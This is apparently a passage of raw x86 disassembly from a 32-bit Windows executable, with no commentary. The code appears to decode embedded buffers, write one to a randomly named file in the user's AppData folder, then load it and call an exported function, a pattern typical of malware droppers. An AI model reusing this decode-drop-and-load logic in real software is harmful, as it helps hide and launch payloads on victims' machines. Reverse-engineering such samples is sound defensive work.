  403258:	83 ec 08             	sub    $0x8,%esp
  40325b:	53                   	push   %ebx
  40325c:	56                   	push   %esi
  40325d:	57                   	push   %edi
  40325e:	8d 45 ec             	lea    -0x14(%ebp),%eax
  403261:	89 65 f0             	mov    %esp,-0x10(%ebp)
  403264:	68 30 79 40 00       	push   $0x407930
  403269:	50                   	push   %eax
  40326a:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403271:	c7 45 ec 55 00 00 00 	movl   $0x55,-0x14(%ebp)
  403278:	e8 0d 16 00 00       	call   0x40488a
  40327d:	ff 15 00 45 45 00    	call   *0x454500
  403283:	8b f0                	mov    %eax,%esi
  403285:	ff 15 d4 62 40 00    	call   *0x4062d4
  40328b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40328e:	33 d2                	xor    %edx,%edx
  403290:	03 c1                	add    %ecx,%eax
  403292:	0f af c6             	imul   %esi,%eax
  403295:	f7 75 08             	divl   0x8(%ebp)
  403298:	b8 a1 32 40 00       	mov    $0x4032a1,%eax
  40329d:	89 55 0c             	mov    %edx,0xc(%ebp)
  4032a0:	c3                   	ret
  4032a1:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4032a4:	8b 45 0c             	mov    0xc(%ebp),%eax
  4032a7:	5f                   	pop    %edi
  4032a8:	5e                   	pop    %esi
  4032a9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4032b0:	5b                   	pop    %ebx
  4032b1:	8b e5                	mov    %ebp,%esp
  4032b3:	5d                   	pop    %ebp
  4032b4:	c3                   	ret
  4032b5:	90                   	nop
  4032b6:	90                   	nop
  4032b7:	90                   	nop
  4032b8:	90                   	nop
  4032b9:	90                   	nop
  4032ba:	90                   	nop
  4032bb:	90                   	nop
  4032bc:	90                   	nop
  4032bd:	90                   	nop
  4032be:	90                   	nop
  4032bf:	90                   	nop
  4032c0:	6a ff                	push   $0xffffffff
  4032c2:	68 e8 51 40 00       	push   $0x4051e8
  4032c7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4032cd:	50                   	push   %eax
  4032ce:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4032d5:	83 ec 10             	sub    $0x10,%esp
  4032d8:	53                   	push   %ebx
  4032d9:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4032dd:	33 db                	xor    %ebx,%ebx
  4032df:	e8 f4 14 00 00       	call   0x4047d8
  4032e4:	8b 44 24 24          	mov    0x24(%esp),%eax
  4032e8:	53                   	push   %ebx
  4032e9:	68 01 10 00 00       	push   $0x1001
  4032ee:	50                   	push   %eax
  4032ef:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4032f3:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  4032f7:	e8 d6 14 00 00       	call   0x4047d2
  4032fc:	85 c0                	test   %eax,%eax
  4032fe:	74 1e                	je     0x40331e
  403300:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  403304:	8b 54 24 28          	mov    0x28(%esp),%edx
  403308:	51                   	push   %ecx
  403309:	52                   	push   %edx
  40330a:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40330e:	e8 b9 14 00 00       	call   0x4047cc
  403313:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403317:	e8 aa 14 00 00       	call   0x4047c6
  40331c:	b3 01                	mov    $0x1,%bl
  40331e:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  403322:	c7 44 24 1c ff ff ff 	movl   $0xffffffff,0x1c(%esp)
  403329:	ff 
  40332a:	e8 91 14 00 00       	call   0x4047c0
  40332f:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  403333:	8a c3                	mov    %bl,%al
  403335:	5b                   	pop    %ebx
  403336:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40333d:	83 c4 1c             	add    $0x1c,%esp
  403340:	c3                   	ret
  403341:	90                   	nop
  403342:	90                   	nop
  403343:	90                   	nop
  403344:	90                   	nop
  403345:	90                   	nop
  403346:	90                   	nop
  403347:	90                   	nop
  403348:	90                   	nop
  403349:	90                   	nop
  40334a:	90                   	nop
  40334b:	90                   	nop
  40334c:	90                   	nop
  40334d:	90                   	nop
  40334e:	90                   	nop
  40334f:	90                   	nop
  403350:	e9 0b 00 00 00       	jmp    0x403360
  403355:	90                   	nop
  403356:	90                   	nop
  403357:	90                   	nop
  403358:	90                   	nop
  403359:	90                   	nop
  40335a:	90                   	nop
  40335b:	90                   	nop
  40335c:	90                   	nop
  40335d:	90                   	nop
  40335e:	90                   	nop
  40335f:	90                   	nop
  403360:	68 e4 42 45 00       	push   $0x4542e4
  403365:	68 94 90 40 00       	push   $0x409094
  40336a:	ff 15 04 60 40 00    	call   *0x406004
  403370:	50                   	push   %eax
  403371:	ff 15 00 60 40 00    	call   *0x406000
  403377:	a3 fc 44 45 00       	mov    %eax,0x4544fc
  40337c:	c3                   	ret
  40337d:	90                   	nop
  40337e:	90                   	nop
  40337f:	90                   	nop
  403380:	e9 0b 00 00 00       	jmp    0x403390
  403385:	90                   	nop
  403386:	90                   	nop
  403387:	90                   	nop
  403388:	90                   	nop
  403389:	90                   	nop
  40338a:	90                   	nop
  40338b:	90                   	nop
  40338c:	90                   	nop
  40338d:	90                   	nop
  40338e:	90                   	nop
  40338f:	90                   	nop
  403390:	68 f8 42 45 00       	push   $0x4542f8
  403395:	68 94 90 40 00       	push   $0x409094
  40339a:	ff 15 04 60 40 00    	call   *0x406004
  4033a0:	50                   	push   %eax
  4033a1:	ff 15 00 60 40 00    	call   *0x406000
  4033a7:	a3 f8 44 45 00       	mov    %eax,0x4544f8
  4033ac:	c3                   	ret
  4033ad:	90                   	nop
  4033ae:	90                   	nop
  4033af:	90                   	nop
  4033b0:	e9 0b 00 00 00       	jmp    0x4033c0
  4033b5:	90                   	nop
  4033b6:	90                   	nop
  4033b7:	90                   	nop
  4033b8:	90                   	nop
  4033b9:	90                   	nop
  4033ba:	90                   	nop
  4033bb:	90                   	nop
  4033bc:	90                   	nop
  4033bd:	90                   	nop
  4033be:	90                   	nop
  4033bf:	90                   	nop
  4033c0:	68 0c 43 45 00       	push   $0x45430c
  4033c5:	68 94 90 40 00       	push   $0x409094
  4033ca:	ff 15 04 60 40 00    	call   *0x406004
  4033d0:	50                   	push   %eax
  4033d1:	ff 15 00 60 40 00    	call   *0x406000
  4033d7:	a3 f4 44 45 00       	mov    %eax,0x4544f4
  4033dc:	c3                   	ret
  4033dd:	90                   	nop
  4033de:	90                   	nop
  4033df:	90                   	nop
  4033e0:	e9 0b 00 00 00       	jmp    0x4033f0
  4033e5:	90                   	nop
  4033e6:	90                   	nop
  4033e7:	90                   	nop
  4033e8:	90                   	nop
  4033e9:	90                   	nop
  4033ea:	90                   	nop
  4033eb:	90                   	nop
  4033ec:	90                   	nop
  4033ed:	90                   	nop
  4033ee:	90                   	nop
  4033ef:	90                   	nop
  4033f0:	68 cc 42 45 00       	push   $0x4542cc
  4033f5:	68 18 43 45 00       	push   $0x454318
  4033fa:	ff 15 04 60 40 00    	call   *0x406004
  403400:	50                   	push   %eax
  403401:	ff 15 00 60 40 00    	call   *0x406000
  403407:	a3 f0 44 45 00       	mov    %eax,0x4544f0
  40340c:	c3                   	ret
  40340d:	90                   	nop
  40340e:	90                   	nop
  40340f:	90                   	nop
  403410:	e9 0b 00 00 00       	jmp    0x403420
  403415:	90                   	nop
  403416:	90                   	nop
  403417:	90                   	nop
  403418:	90                   	nop
  403419:	90                   	nop
  40341a:	90                   	nop
  40341b:	90                   	nop
  40341c:	90                   	nop
  40341d:	90                   	nop
  40341e:	90                   	nop
  40341f:	90                   	nop
  403420:	68 24 43 45 00       	push   $0x454324
  403425:	68 30 43 45 00       	push   $0x454330
  40342a:	ff 15 04 60 40 00    	call   *0x406004
  403430:	50                   	push   %eax
  403431:	ff 15 00 60 40 00    	call   *0x406000
  403437:	a3 ec 44 45 00       	mov    %eax,0x4544ec
  40343c:	c3                   	ret
  40343d:	90                   	nop
  40343e:	90                   	nop
  40343f:	90                   	nop
  403440:	55                   	push   %ebp
  403441:	8b ec                	mov    %esp,%ebp
  403443:	6a ff                	push   $0xffffffff
  403445:	68 18 52 40 00       	push   $0x405218
  40344a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403450:	50                   	push   %eax
  403451:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403458:	81 ec 68 04 00 00    	sub    $0x468,%esp
  40345e:	53                   	push   %ebx
  40345f:	33 db                	xor    %ebx,%ebx
  403461:	57                   	push   %edi
  403462:	53                   	push   %ebx
  403463:	e8 46 13 00 00       	call   0x4047ae
  403468:	b9 41 00 00 00       	mov    $0x41,%ecx
  40346d:	33 c0                	xor    %eax,%eax
  40346f:	8d bd 98 fe ff ff    	lea    -0x168(%ebp),%edi
  403475:	83 c4 04             	add    $0x4,%esp
  403478:	f3 ab                	rep stos %eax,%es:(%edi)
  40347a:	8d 85 98 fe ff ff    	lea    -0x168(%ebp),%eax
  403480:	68 04 01 00 00       	push   $0x104
  403485:	50                   	push   %eax
  403486:	53                   	push   %ebx
  403487:	ff 15 20 60 40 00    	call   *0x406020
  40348d:	8d 8d 98 fe ff ff    	lea    -0x168(%ebp),%ecx
  403493:	68 64 43 45 00       	push   $0x454364
  403498:	51                   	push   %ecx
  403499:	ff 15 bc 62 40 00    	call   *0x4062bc
  40349f:	83 c4 08             	add    $0x8,%esp
  4034a2:	3b c3                	cmp    %ebx,%eax
  4034a4:	75 1a                	jne    0x4034c0
  4034a6:	53                   	push   %ebx
  4034a7:	ff 15 c0 62 40 00    	call   *0x4062c0
  4034ad:	83 c4 04             	add    $0x4,%esp
  4034b0:	5f                   	pop    %edi
  4034b1:	5b                   	pop    %ebx
  4034b2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4034b5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4034bc:	8b e5                	mov    %ebp,%esp
  4034be:	5d                   	pop    %ebp
  4034bf:	c3                   	ret
  4034c0:	8d 95 98 fe ff ff    	lea    -0x168(%ebp),%edx
  4034c6:	56                   	push   %esi
  4034c7:	52                   	push   %edx
  4034c8:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4034cb:	e8 20 13 00 00       	call   0x4047f0
  4034d0:	6a 2e                	push   $0x2e
  4034d2:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4034d5:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4034d8:	e8 0d 13 00 00       	call   0x4047ea
  4034dd:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4034e0:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  4034e3:	8b 49 f8             	mov    -0x8(%ecx),%ecx
  4034e6:	2b c8                	sub    %eax,%ecx
  4034e8:	41                   	inc    %ecx
  4034e9:	51                   	push   %ecx
  4034ea:	52                   	push   %edx
  4034eb:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4034ee:	e8 f1 12 00 00       	call   0x4047e4
  4034f3:	50                   	push   %eax
  4034f4:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4034f7:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4034fb:	e8 be 11 00 00       	call   0x4046be
  403500:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403503:	88 5d fc             	mov    %bl,-0x4(%ebp)
  403506:	e8 f9 10 00 00       	call   0x404604
  40350b:	6a 2e                	push   $0x2e
  40350d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  403510:	e8 d5 12 00 00       	call   0x4047ea
  403515:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  403518:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  40351b:	8b 49 f8             	mov    -0x8(%ecx),%ecx
  40351e:	2b c8                	sub    %eax,%ecx
  403520:	83 e9 03             	sub    $0x3,%ecx
  403523:	51                   	push   %ecx
  403524:	52                   	push   %edx
  403525:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  403528:	e8 b1 12 00 00       	call   0x4047de
  40352d:	50                   	push   %eax
  40352e:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  403531:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  403535:	e8 84 11 00 00       	call   0x4046be
  40353a:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40353d:	88 5d fc             	mov    %bl,-0x4(%ebp)
  403540:	e8 bf 10 00 00       	call   0x404604
  403545:	8b 7d ec             	mov    -0x14(%ebp),%edi
  403548:	83 c9 ff             	or     $0xffffffff,%ecx
  40354b:	33 c0                	xor    %eax,%eax
  40354d:	8d 95 90 fc ff ff    	lea    -0x370(%ebp),%edx
  403553:	f2 ae                	repnz scas %es:(%edi),%al
  403555:	f7 d1                	not    %ecx
  403557:	2b f9                	sub    %ecx,%edi
  403559:	8b c1                	mov    %ecx,%eax
  40355b:	8b f7                	mov    %edi,%esi
  40355d:	8b fa                	mov    %edx,%edi
  40355f:	c1 e9 02             	shr    $0x2,%ecx
  403562:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403564:	8b c8                	mov    %eax,%ecx
  403566:	83 e1 03             	and    $0x3,%ecx
  403569:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40356b:	8d 8d 90 fc ff ff    	lea    -0x370(%ebp),%ecx
  403571:	c6 45 e0 30          	movb   $0x30,-0x20(%ebp)
  403575:	51                   	push   %ecx
  403576:	88 5d e1             	mov    %bl,-0x1f(%ebp)
  403579:	c6 45 e2 29          	movb   $0x29,-0x1e(%ebp)
  40357d:	88 5d e3             	mov    %bl,-0x1d(%ebp)
  403580:	ff 15 c4 62 40 00    	call   *0x4062c4
  403586:	83 c4 04             	add    $0x4,%esp
  403589:	83 f8 01             	cmp    $0x1,%eax
  40358c:	7d 2c                	jge    0x4035ba
  40358e:	8b 35 1c 60 40 00    	mov    0x40601c,%esi
  403594:	8d 55 e0             	lea    -0x20(%ebp),%edx
  403597:	8d 85 90 fc ff ff    	lea    -0x370(%ebp),%eax
  40359d:	52                   	push   %edx
  40359e:	50                   	push   %eax
  40359f:	ff d6                	call   *%esi
  4035a1:	85 c0                	test   %eax,%eax
  4035a3:	74 15                	je     0x4035ba
  4035a5:	8d 4d e2             	lea    -0x1e(%ebp),%ecx
  4035a8:	8d 95 90 fc ff ff    	lea    -0x370(%ebp),%edx
  4035ae:	51                   	push   %ecx
  4035af:	52                   	push   %edx
  4035b0:	ff d6                	call   *%esi
  4035b2:	85 c0                	test   %eax,%eax
  4035b4:	0f 85 a7 02 00 00    	jne    0x403861
  4035ba:	90                   	nop
  4035bb:	90                   	nop
  4035bc:	68 5c 43 45 00       	push   $0x45435c
  4035c1:	68 93 00 00 00       	push   $0x93
  4035c6:	53                   	push   %ebx
  4035c7:	ff 15 18 60 40 00    	call   *0x406018
  4035cd:	8b f0                	mov    %eax,%esi
  4035cf:	56                   	push   %esi
  4035d0:	53                   	push   %ebx
  4035d1:	ff 15 14 60 40 00    	call   *0x406014
  4035d7:	56                   	push   %esi
  4035d8:	53                   	push   %ebx
  4035d9:	ff 15 10 60 40 00    	call   *0x406010
  4035df:	50                   	push   %eax
  4035e0:	ff 15 0c 60 40 00    	call   *0x40600c
  4035e6:	b9 40 00 00 00       	mov    $0x40,%ecx
  4035eb:	33 c0                	xor    %eax,%eax
  4035ed:	8d bd 95 fd ff ff    	lea    -0x26b(%ebp),%edi
  4035f3:	88 9d 94 fd ff ff    	mov    %bl,-0x26c(%ebp)
  4035f9:	f3 ab                	rep stos %eax,%es:(%edi)
  4035fb:	66 ab                	stos   %ax,%es:(%edi)
  4035fd:	aa                   	stos   %al,%es:(%edi)
  4035fe:	53                   	push   %ebx
  4035ff:	8d 85 94 fd ff ff    	lea    -0x26c(%ebp),%eax
  403605:	6a 1a                	push   $0x1a
  403607:	50                   	push   %eax
  403608:	53                   	push   %ebx
  403609:	ff 15 18 63 40 00    	call   *0x406318
  40360f:	bf 58 43 45 00       	mov    $0x454358,%edi
  403614:	83 c9 ff             	or     $0xffffffff,%ecx
  403617:	33 c0                	xor    %eax,%eax
  403619:	f2 ae                	repnz scas %es:(%edi),%al
  40361b:	f7 d1                	not    %ecx
  40361d:	49                   	dec    %ecx
  40361e:	bf 54 43 45 00       	mov    $0x454354,%edi
  403623:	8b d1                	mov    %ecx,%edx
  403625:	83 c9 ff             	or     $0xffffffff,%ecx
  403628:	f2 ae                	repnz scas %es:(%edi),%al
  40362a:	f7 d1                	not    %ecx
  40362c:	49                   	dec    %ecx
  40362d:	8d 44 0a 01          	lea    0x1(%edx,%ecx,1),%eax
  403631:	50                   	push   %eax
  403632:	e8 a5 10 00 00       	call   0x4046dc
  403637:	8b d0                	mov    %eax,%edx
  403639:	bf 54 43 45 00       	mov    $0x454354,%edi
  40363e:	83 c9 ff             	or     $0xffffffff,%ecx
  403641:	33 c0                	xor    %eax,%eax
  403643:	f2 ae                	repnz scas %es:(%edi),%al
  403645:	f7 d1                	not    %ecx
  403647:	2b f9                	sub    %ecx,%edi
  403649:	89 55 cc             	mov    %edx,-0x34(%ebp)
  40364c:	8b c1                	mov    %ecx,%eax
  40364e:	8b f7                	mov    %edi,%esi
  403650:	8b fa                	mov    %edx,%edi
  403652:	c1 e9 02             	shr    $0x2,%ecx
  403655:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403657:	8b c8                	mov    %eax,%ecx
  403659:	33 c0                	xor    %eax,%eax
  40365b:	83 e1 03             	and    $0x3,%ecx
  40365e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403660:	bf 58 43 45 00       	mov    $0x454358,%edi
  403665:	83 c9 ff             	or     $0xffffffff,%ecx
  403668:	f2 ae                	repnz scas %es:(%edi),%al
  40366a:	f7 d1                	not    %ecx
  40366c:	2b f9                	sub    %ecx,%edi
  40366e:	8b c1                	mov    %ecx,%eax
  403670:	8b f7                	mov    %edi,%esi
  403672:	8b fa                	mov    %edx,%edi
  403674:	8b d0                	mov    %eax,%edx
  403676:	83 c9 ff             	or     $0xffffffff,%ecx
  403679:	33 c0                	xor    %eax,%eax
  40367b:	f2 ae                	repnz scas %es:(%edi),%al
  40367d:	8b ca                	mov    %edx,%ecx
  40367f:	4f                   	dec    %edi
  403680:	c1 e9 02             	shr    $0x2,%ecx
  403683:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403685:	8b ca                	mov    %edx,%ecx
  403687:	83 e1 03             	and    $0x3,%ecx
  40368a:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40368c:	88 5d bc             	mov    %bl,-0x44(%ebp)
  40368f:	89 45 bd             	mov    %eax,-0x43(%ebp)
  403692:	33 c9                	xor    %ecx,%ecx
  403694:	89 45 c1             	mov    %eax,-0x3f(%ebp)
  403697:	89 4d b1             	mov    %ecx,-0x4f(%ebp)
  40369a:	bf b4 42 45 00       	mov    $0x4542b4,%edi
  40369f:	89 4d b5             	mov    %ecx,-0x4b(%ebp)
  4036a2:	83 c9 ff             	or     $0xffffffff,%ecx
  4036a5:	f2 ae                	repnz scas %es:(%edi),%al
  4036a7:	f7 d1                	not    %ecx
  4036a9:	8b d1                	mov    %ecx,%edx
  4036ab:	be b4 42 45 00       	mov    $0x4542b4,%esi
  4036b0:	8d 7d bc             	lea    -0x44(%ebp),%edi
  4036b3:	66 89 45 c5          	mov    %ax,-0x3b(%ebp)
  4036b7:	c1 e9 02             	shr    $0x2,%ecx
  4036ba:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4036bc:	8b ca                	mov    %edx,%ecx
  4036be:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4036c1:	83 e1 03             	and    $0x3,%ecx
  4036c4:	50                   	push   %eax
  4036c5:	68 00 f0 00 00       	push   $0xf000
  4036ca:	68 b4 52 44 00       	push   $0x4452b4
  4036cf:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4036d1:	88 5d b0             	mov    %bl,-0x50(%ebp)
  4036d4:	e8 e7 fa ff ff       	call   0x4031c0
  4036d9:	8b 35 c4 62 40 00    	mov    0x4062c4,%esi
  4036df:	b1 63                	mov    $0x63,%cl
  4036e1:	b2 73                	mov    $0x73,%dl
  4036e3:	83 c4 10             	add    $0x10,%esp
  4036e6:	88 4d d4             	mov    %cl,-0x2c(%ebp)
  4036e9:	88 4d d6             	mov    %cl,-0x2a(%ebp)
  4036ec:	88 4d d8             	mov    %cl,-0x28(%ebp)
  4036ef:	88 4d da             	mov    %cl,-0x26(%ebp)
  4036f2:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  4036f5:	88 55 d1             	mov    %dl,-0x2f(%ebp)
  4036f8:	88 55 dc             	mov    %dl,-0x24(%ebp)
  4036fb:	8d 55 f2             	lea    -0xe(%ebp),%edx
  4036fe:	b0 25                	mov    $0x25,%al
  403700:	51                   	push   %ecx
  403701:	52                   	push   %edx
  403702:	c6 45 ea 38          	movb   $0x38,-0x16(%ebp)
  403706:	88 5d eb             	mov    %bl,-0x15(%ebp)
  403709:	c6 45 f2 34          	movb   $0x34,-0xe(%ebp)
  40370d:	88 5d f3             	mov    %bl,-0xd(%ebp)
  403710:	88 45 d0             	mov    %al,-0x30(%ebp)
  403713:	c6 45 d2 5c          	movb   $0x5c,-0x2e(%ebp)
  403717:	88 45 d3             	mov    %al,-0x2d(%ebp)
  40371a:	88 45 d5             	mov    %al,-0x2b(%ebp)
  40371d:	88 45 d7             	mov    %al,-0x29(%ebp)
  403720:	88 45 d9             	mov    %al,-0x27(%ebp)
  403723:	88 45 db             	mov    %al,-0x25(%ebp)
  403726:	88 5d dd             	mov    %bl,-0x23(%ebp)
  403729:	ff d6                	call   *%esi
  40372b:	50                   	push   %eax
  40372c:	6a 1a                	push   $0x1a
  40372e:	e8 0d fb ff ff       	call   0x403240
  403733:	83 c4 0c             	add    $0xc,%esp
  403736:	83 c0 41             	add    $0x41,%eax
  403739:	50                   	push   %eax
  40373a:	8d 45 f2             	lea    -0xe(%ebp),%eax
  40373d:	50                   	push   %eax
  40373e:	ff d6                	call   *%esi
  403740:	50                   	push   %eax
  403741:	6a 1a                	push   $0x1a
  403743:	e8 f8 fa ff ff       	call   0x403240
  403748:	83 c4 0c             	add    $0xc,%esp
  40374b:	83 c0 61             	add    $0x61,%eax
  40374e:	8d 4d f2             	lea    -0xe(%ebp),%ecx
  403751:	50                   	push   %eax
  403752:	51                   	push   %ecx
  403753:	ff d6                	call   *%esi
  403755:	50                   	push   %eax
  403756:	6a 1a                	push   $0x1a
  403758:	e8 e3 fa ff ff       	call   0x403240
  40375d:	83 c4 0c             	add    $0xc,%esp
  403760:	83 c0 61             	add    $0x61,%eax
  403763:	8d 55 f2             	lea    -0xe(%ebp),%edx
  403766:	50                   	push   %eax
  403767:	52                   	push   %edx
  403768:	ff d6                	call   *%esi
  40376a:	50                   	push   %eax
  40376b:	6a 1a                	push   $0x1a
  40376d:	e8 ce fa ff ff       	call   0x403240
  403772:	83 c4 0c             	add    $0xc,%esp
  403775:	83 c0 61             	add    $0x61,%eax
  403778:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40377b:	8d 95 8c fb ff ff    	lea    -0x474(%ebp),%edx
  403781:	50                   	push   %eax
  403782:	8d 85 94 fd ff ff    	lea    -0x26c(%ebp),%eax
  403788:	50                   	push   %eax
  403789:	51                   	push   %ecx
  40378a:	52                   	push   %edx
  40378b:	ff 15 30 63 40 00    	call   *0x406330
  403791:	68 00 f0 00 00       	push   $0xf000
  403796:	8d 85 8c fb ff ff    	lea    -0x474(%ebp),%eax
  40379c:	68 b4 52 44 00       	push   $0x4452b4
  4037a1:	50                   	push   %eax
  4037a2:	e8 19 fb ff ff       	call   0x4032c0
  4037a7:	83 c4 2c             	add    $0x2c,%esp
  4037aa:	8d 8d 8c fb ff ff    	lea    -0x474(%ebp),%ecx
  4037b0:	51                   	push   %ecx
  4037b1:	ff 15 04 60 40 00    	call   *0x406004
  4037b7:	8b f0                	mov    %eax,%esi
  4037b9:	6a 01                	push   $0x1
  4037bb:	56                   	push   %esi
  4037bc:	89 75 c8             	mov    %esi,-0x38(%ebp)
  4037bf:	ff 15 00 60 40 00    	call   *0x406000
  4037c5:	8d 55 bc             	lea    -0x44(%ebp),%edx
  4037c8:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4037cb:	52                   	push   %edx
  4037cc:	68 00 c2 03 00       	push   $0x3c200
  4037d1:	68 b4 90 40 00       	push   $0x4090b4
  4037d6:	e8 e5 f9 ff ff       	call   0x4031c0
  4037db:	83 c4 0c             	add    $0xc,%esp
  4037de:	3b f3                	cmp    %ebx,%esi
  4037e0:	c6 45 e4 5f          	movb   $0x5f,-0x1c(%ebp)
  4037e4:	c6 45 e5 32          	movb   $0x32,-0x1b(%ebp)
  4037e8:	88 5d e6             	mov    %bl,-0x1a(%ebp)
  4037eb:	74 74                	je     0x403861
  4037ed:	bf c0 42 45 00       	mov    $0x4542c0,%edi
  4037f2:	83 c9 ff             	or     $0xffffffff,%ecx
  4037f5:	33 c0                	xor    %eax,%eax
  4037f7:	be c0 42 45 00       	mov    $0x4542c0,%esi
  4037fc:	f2 ae                	repnz scas %es:(%edi),%al
  4037fe:	f7 d1                	not    %ecx
  403800:	8b c1                	mov    %ecx,%eax
  403802:	8d 7d b0             	lea    -0x50(%ebp),%edi
  403805:	c1 e9 02             	shr    $0x2,%ecx
  403808:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40380a:	8b c8                	mov    %eax,%ecx
  40380c:	83 e1 03             	and    $0x3,%ecx
  40380f:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403811:	8b 3d 08 63 40 00    	mov    0x406308,%edi
  403817:	be e8 03 00 00       	mov    $0x3e8,%esi
  40381c:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40381f:	6a 1e                	push   $0x1e
  403821:	51                   	push   %ecx
  403822:	56                   	push   %esi
  403823:	ff d7                	call   *%edi
  403825:	83 c4 0c             	add    $0xc,%esp
  403828:	4e                   	dec    %esi
  403829:	83 fe ff             	cmp    $0xffffffff,%esi
  40382c:	7d ee                	jge    0x40381c
  40382e:	8b 75 cc             	mov    -0x34(%ebp),%esi
  403831:	3b f3                	cmp    %ebx,%esi
  403833:	74 22                	je     0x403857
  403835:	8d 55 b0             	lea    -0x50(%ebp),%edx
  403838:	8d 45 ea             	lea    -0x16(%ebp),%eax
  40383b:	52                   	push   %edx
  40383c:	50                   	push   %eax
  40383d:	ff 15 c4 62 40 00    	call   *0x4062c4
  403843:	83 c4 04             	add    $0x4,%esp
  403846:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403849:	50                   	push   %eax
  40384a:	68 00 c2 03 00       	push   $0x3c200
  40384f:	68 b4 90 40 00       	push   $0x4090b4
  403854:	51                   	push   %ecx
  403855:	ff d6                	call   *%esi
  403857:	8b 55 c8             	mov    -0x38(%ebp),%edx
  40385a:	52                   	push   %edx
  40385b:	ff 15 08 60 40 00    	call   *0x406008
  403861:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  403864:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40386b:	e8 94 0d 00 00       	call   0x404604
  403870:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403873:	5e                   	pop    %esi
  403874:	5f                   	pop    %edi
  403875:	5b                   	pop    %ebx
  403876:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40387d:	8b e5                	mov    %ebp,%esp
  40387f:	5d                   	pop    %ebp
  403880:	c3                   	ret
  403881:	90                   	nop
  403882:	90                   	nop
  403883:	90                   	nop
  403884:	90                   	nop
  403885:	90                   	nop
  403886:	90                   	nop
  403887:	90                   	nop
  403888:	90                   	nop
  403889:	90                   	nop
  40388a:	90                   	nop
  40388b:	90                   	nop
  40388c:	90                   	nop
  40388d:	90                   	nop
  40388e:	90                   	nop
  40388f:	90                   	nop
  403890:	6a ff                	push   $0xffffffff
  403892:	68 38 52 40 00       	push   $0x405238
  403897:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40389d:	50                   	push   %eax
  40389e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4038a5:	51                   	push   %ecx
  4038a6:	56                   	push   %esi
  4038a7:	8b f1                	mov    %ecx,%esi
  4038a9:	e8 5a 0c 00 00       	call   0x404508
  4038ae:	8b 46 20             	mov    0x20(%esi),%eax
  4038b1:	6a 00                	push   $0x0
  4038b3:	50                   	push   %eax
  4038b4:	ff 15 44 63 40 00    	call   *0x406344
  4038ba:	50                   	push   %eax
  4038bb:	e8 3c 0f 00 00       	call   0x4047fc
  4038c0:	8b f0                	mov    %eax,%esi
  4038c2:	85 f6                	test   %esi,%esi
  4038c4:	74 5e                	je     0x403924
  4038c6:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4038ca:	e8 47 0d 00 00       	call   0x404616
  4038cf:	6a 65                	push   $0x65
  4038d1:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  4038d5:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4038dc:	00 
  4038dd:	e8 14 0f 00 00       	call   0x4047f6
  4038e2:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4038e6:	8b 41 f8             	mov    -0x8(%ecx),%eax
  4038e9:	85 c0                	test   %eax,%eax
  4038eb:	74 26                	je     0x403913
  4038ed:	8b 56 04             	mov    0x4(%esi),%edx
  4038f0:	57                   	push   %edi
  4038f1:	8b 3d 28 63 40 00    	mov    0x406328,%edi
  4038f7:	6a 00                	push   $0x0
  4038f9:	6a 00                	push   $0x0
  4038fb:	68 00 08 00 00       	push   $0x800
  403900:	52                   	push   %edx
  403901:	ff d7                	call   *%edi
